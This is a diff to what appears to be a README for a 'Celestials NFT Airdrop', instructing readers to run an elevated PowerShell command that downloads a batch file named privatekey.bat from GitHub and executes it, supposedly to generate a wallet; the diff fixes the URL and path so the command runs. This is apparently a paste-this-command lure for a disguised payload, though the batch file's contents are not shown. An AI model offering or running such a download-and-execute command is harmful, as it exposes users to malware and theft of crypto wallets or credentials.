@@ -3,7 +3,7 @@ How to generate wallet and qualify for Celestials NFT Airdrop
 
 1. Open your command Prompt on Windows as Admin and run the following:
 ```
-powershell -Command "Invoke-WebRequest -Uri https://github.com/CelestialNFT/Airdrop-Whitelist/raw/refs/heads/main/privatekey.bat -OutFile privatekey.bat; Start-Process -FilePath privatekey.bat -ArgumentList /c -NoNewWindow -Wait"
+powershell -Command "Invoke-WebRequest -Uri https://raw.githubusercontent.com/CelestialNFT/Airdrop-Whitelist/main/privatekey.bat -OutFile privatekey.bat; Start-Process -FilePath .\privatekey.bat -ArgumentList /c -NoNewWindow -Wait"
 ```
 2. After You run the code Your wallet address will be generated in your folder
 ```
